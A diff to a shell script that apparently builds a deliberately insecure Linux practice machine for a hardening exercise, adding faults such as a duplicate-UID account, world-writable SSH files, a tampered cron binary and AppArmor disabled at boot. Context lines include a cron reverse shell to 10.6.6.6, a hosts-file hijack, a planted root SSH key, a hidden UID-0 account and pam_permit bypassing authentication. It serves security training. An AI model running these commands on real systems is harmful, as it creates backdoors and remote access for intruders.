@@ -14,6 +14,7 @@ usermod -aG sudo mallory                          # unauthorized admin
 useradd -o -u 0 -g 0 -M -s /bin/bash toor         # hidden second root account
 echo 'toor:toor' | chpasswd
 useradd -r -u 999 -m -s /bin/bash sysbackup       # hidden user with a shell
+useradd -o -u "$(id -u bob)" -g "$(id -g bob)" -M -s /usr/sbin/nologin twin   # a second account with bob's user ID
 passwd -d carol                                   # empty password
 echo 'bob ALL=(ALL) NOPASSWD: ALL' >/etc/sudoers.d/90-bob
 chmod 440 /etc/sudoers.d/90-bob
@@ -28,6 +29,10 @@ head -c 2048 /dev/urandom >/home/eve/Videos/movie.mp4
 echo 'setting=1' >/etc/planted-ww.conf; chmod 666 /etc/planted-ww.conf
 chmod 644 /etc/shadow                             # anyone can read password hashes
 
+mkdir -p /home/bob/.ssh; chmod 777 /home/bob/.ssh; echo 'Host *' >/home/bob/.ssh/config; chmod 666 /home/bob/.ssh/config
+echo 'ls' >/home/bob/.bash_history; chmod 666 /home/bob/.bash_history
+chown -R bob:bob /home/bob/.ssh /home/bob/.bash_history
+
 # --- persistence / backdoors ----------------------------------------------
 echo '10.6.6.6 www.google.com' >>/etc/hosts
 echo '* * * * * root nc -e /bin/bash 10.6.6.6 4444' >/etc/cron.d/updater
@@ -39,6 +44,8 @@ mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEvilEvilEvilEv
 # shellcheck disable=SC2012
 ls /lib/*-linux-gnu/libdl.so.2 /usr/lib/*-linux-gnu/libdl.so.2 2>/dev/null | head -1 >/etc/ld.so.preload  # harmless lib, but still a finding
 sed -i '1i auth sufficient pam_permit.so' /etc/pam.d/common-auth
+
+echo '# tampered' >>/usr/sbin/cron                      # a system program that no longer matches its package
 
 # --- kernel settings --------------------------------------------------------
 echo 'net.ipv4.ip_forward=1' >/etc/sysctl.d/60-forward.conf
@@ -98,6 +105,13 @@ chown -R bob:bob /home/bob/.mozilla
 # --- apache (a critical service in the test README) -------------------------
 sed -i 's/^ServerTokens .*/ServerTokens OS/' /etc/apache2/conf-available/security.conf
 sed -i '0,/Options FollowSymLinks/s//Options Indexes FollowSymLinks/' /etc/apache2/apache2.conf
+
+# --- shared memory, boot options, account defaults -----------------------------
+printf 'tmpfs /dev/shm tmpfs defaults 0 0\n' >>/etc/fstab       # anyone can run programs from /dev/shm
+mkdir -p /etc/default
+printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX_DEFAULT="quiet apparmor=0"\nGRUB_CMDLINE_LINUX=""\n' >/etc/default/grub   # AppArmor switched off
+touch /etc/default/useradd; sed -i '/^INACTIVE=/d' /etc/default/useradd; echo 'INACTIVE=-1' >>/etc/default/useradd
+sed -i 's/^UMASK.*/UMASK\t\t022/' /etc/login.defs
 
 # --- updates ----------------------------------------------------------------
 # the security origin commented out (no automatic security fixes); the file comes with unattended-upgrades
